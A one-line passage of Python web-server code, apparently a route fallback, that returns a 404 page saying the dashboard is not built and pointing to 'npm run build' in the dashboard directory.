    return HTMLResponse("<h1>Dashboard not built</h1><p>Run <code>npm run build</code> in the dashboard directory.</p>", status_code=404)
